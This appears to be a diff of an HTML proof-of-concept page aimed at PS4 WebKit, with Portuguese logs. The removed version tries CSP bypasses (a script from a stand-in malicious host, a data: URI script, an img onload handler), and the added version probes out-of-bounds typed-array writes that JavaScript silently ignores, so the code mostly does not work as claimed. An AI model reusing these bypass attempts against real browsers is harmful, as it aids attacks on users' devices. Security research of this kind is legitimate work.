@@ -2,83 +2,76 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 WebKit Combined Privilege Escalation POC</title>
+    <title>PS4 WebKit Advanced OOB Write POC (v12.00)</title>
+    <style>
+        body { font-family: monospace; }
+        #output { white-space: pre-wrap; }
+        .error { color: red; }
+        .warning { color: orange; }
+        .success { color: green; }
+        .info { color: blue; }
+        .critical { color: magenta; font-weight: bold; }
+    </style>
 </head>
 <body>
-    <h1>PS4 WebKit Combined Privilege Escalation POC</h1>
+    <h1>PS4 WebKit Advanced OOB Write POC (v12.00)</h1>
     <div id="output"></div>
 
     <script>
-        async function triggerCombinedExploit() {
+        async function advancedOOBWriteTest() {
             const outputDiv = document.getElementById('output');
-            outputDiv.innerHTML += "<h2>Iniciando PoC Combinada de Escalada de Privilégios...</h2>";
+            const log = (message, type = 'info') => {
+                outputDiv.innerHTML += `<span class="${type}">${new Date().toLocaleTimeString()} - ${message}\n</span>`;
+            };
 
-            // ====================== Passo 1: Tentativa de OOB Write para Corrupção ======================
-            outputDiv.innerHTML += "<p><strong>Passo 1: Tentando OOB Write para Corromper Memória relacionada ao CSP...</strong></p>";
-            try {
-                const bufferSize = 64; // Aumentando o tamanho para mais flexibilidade
-                const buffer = new ArrayBuffer(bufferSize);
-                const view = new Uint8Array(buffer);
-                const writeOffset = 70; // Tentando escrever alguns bytes após o buffer
-                const writeValue = 0x00; // Escrevendo zeros para tentar sobrescrever flags ou contadores
+            log("Iniciando Teste Avançado de OOB Write...", 'critical');
 
-                view[writeOffset] = writeValue;
-                outputDiv.innerHTML += `<p>Tentativa de escrita de 0x${writeValue.toString(16)} no offset ${writeOffset} (fora dos limites).</p>`;
+            const bufferSize = 128;
+            const buffer = new ArrayBuffer(bufferSize);
+            const view = new Uint8Array(buffer);
+            const writeValue = 0xAA;
 
-                // Pequeno delay para a escrita ocorrer
-                await new Promise(resolve => setTimeout(resolve, 500));
+            const offsetsToWrite = [-64, -1, 0, bufferSize - 1, bufferSize, bufferSize + 64, bufferSize * 2];
+            const offsetsToRead = [-32, 0, 32, bufferSize - 1, bufferSize, bufferSize + 32, bufferSize * 2 - 1];
 
-                outputDiv.innerHTML += "<p><strong>Verificando se a OOB Write teve algum efeito (indireto)...</strong></p>";
-                // Aqui, poderíamos tentar acionar algum comportamento que seria afetado por uma corrupção relacionada ao CSP,
-                // como tentar carregar um script de uma fonte que deveria ser bloqueada.
-                const testScript = document.createElement('script');
-                testScript.src = 'http://malicious.example.com/should_be_blocked.js';
-                testScript.onload = function() {
-                    outputDiv.innerHTML += "<p><strong style='color: red;'>FALHA NA SEGURANÇA! Script de fonte bloqueada carregou (possível corrupção de CSP via OOB Write).</strong></p>";
-                    // Se isso acontecer, a escalada de privilégios é significativa.
-                };
-                testScript.onerror = function() {
-                    outputDiv.innerHTML += "<p>Script de fonte bloqueada NÃO carregou (comportamento esperado do CSP).</p>";
-                };
-                document.body.appendChild(testScript);
+            log(`ArrayBuffer criado com tamanho: ${bufferSize}`, 'info');
+            log(`Valor de escrita: 0x${writeValue.toString(16)}`, 'info');
+            log(`Offsets de escrita a serem testados: ${offsetsToWrite.join(', ')}`, 'info');
+            log(`Offsets de leitura a serem testados após cada escrita: ${offsetsToRead.join(', ')}`, 'info');
 
-                // Limpar o script para não interferir em testes futuros
-                setTimeout(() => document.body.removeChild(testScript), 2000);
+            for (const writeOffset of offsetsToWrite) {
+                log(`\nTentando escrever 0x${writeValue.toString(16)} no offset: ${writeOffset}`, 'warning');
+                try {
+                    view[writeOffset] = writeValue;
+                    log(`Escrita no offset ${writeOffset} aparentemente bem-sucedida (sem erro imediato).`, 'success');
 
-            } catch (error) {
-                outputDiv.innerHTML += `<p><strong style='color: orange;'>Erro durante a tentativa de OOB Write:</strong> ${error.message}</p>`;
+                    for (const readOffset of offsetsToRead) {
+                        try {
+                            const readValue = view[readOffset];
+                            log(`  Leitura no offset ${readOffset}: 0x${readValue.toString(16)} após escrita no offset ${writeOffset}.`, 'info');
+                            if (readOffset >= 0 && readOffset < bufferSize && readValue === writeValue && writeOffset >= bufferSize) {
+                                log(`  <span class="critical">POSSÍVEL CORRUPÇÃO DE MEMÓRIA: Escrita fora dos limites (${writeOffset}) afetou leitura dentro dos limites (${readOffset})!</span>`, 'critical');
+                            } else if (readOffset >= 0 && readOffset < bufferSize && readValue === writeValue && writeOffset < 0) {
+                                log(`  <span class="critical">POSSÍVEL CORRUPÇÃO DE MEMÓRIA (OFFSET NEGATIVO): Escrita fora dos limites (${writeOffset}) afetou leitura dentro dos limites (${readOffset})!</span>`, 'critical');
+                            } else if (readOffset !== 0 && writeOffset === 0 && readValue === writeValue) {
+                                log(`  <span class="warning">AVISO: Escrita no início do buffer afetou leitura em outro offset (${readOffset}).</span>`, 'warning');
+                            }
+                        } catch (readError) {
+                            log(`  Erro ao ler no offset ${readOffset}: ${readError.message}`, 'error');
+                        }
+                    }
+
+                } catch (writeError) {
+                    log(`Erro ao escrever no offset ${writeOffset}: ${writeError.message}`, 'error');
+                }
+                await new Promise(resolve => setTimeout(resolve, 1000)); // Pequeno delay entre as tentativas
             }
 
-            await new Promise(resolve => setTimeout(resolve, 2000)); // Mais um delay
-
-            // ====================== Passo 2: Tentativa de Bypass de CSP ======================
-            outputDiv.innerHTML += "<p><strong>Passo 2: Tentando Bypass de CSP via data: URI...</strong></p>";
-            const scriptBypass = document.createElement('script');
-            scriptBypass.src = 'data:text/javascript;base64,YWxlcnQoJ1ZQdW4gYmF5cGFzcyBjb21ib28hJyk7'; // alert('Vupun bypass combo!');
-            scriptBypass.onload = function() {
-                outputDiv.innerHTML += "<p><strong style='color: green;'>Bypass de CSP via data: URI BEM-SUCEDIDO! (Mesmo após a tentativa de OOB Write).</strong></p>";
-                // Se chegarmos aqui, mesmo que a OOB Write não tenha escalado privilégios diretamente,
-                // ainda temos execução de código arbitrário via bypass de CSP.
-            };
-            scriptBypass.onerror = function() {
-                outputDiv.innerHTML += "<p><strong style='color: orange;'>Falha ao bypassar o CSP via data: URI.</strong></p>";
-            };
-            document.body.appendChild(scriptBypass);
-
-            await new Promise(resolve => setTimeout(resolve, 2000));
-
-            outputDiv.innerHTML += "<p><strong>Tentando Bypass de CSP via atributo onload (em img)...</strong></p>";
-            const imgBypass = document.createElement('img');
-            imgBypass.setAttribute('onload', 'alert(\'Vupun bypass combo onload!\');');
-            imgBypass.src = 'invalid-image.jpg';
-            document.body.appendChild(imgBypass);
-
-            await new Promise(resolve => setTimeout(resolve, 2000));
-
-            outputDiv.innerHTML += "<p><strong>Testes combinados concluídos. Verifique os alertas e a saída.</strong></p>";
+            log("\nTeste Avançado de OOB Write Concluído.", 'critical');
+            log("Analise cuidadosamente a saída para identificar possíveis corrupções de memória.", 'critical');
         }
 
-        document.addEventListener('DOMContentLoaded', triggerCombinedExploit);
+        document.addEventListener('DOMContentLoaded', advancedOOBWriteTest);
     </script>
 </body>
 </html>
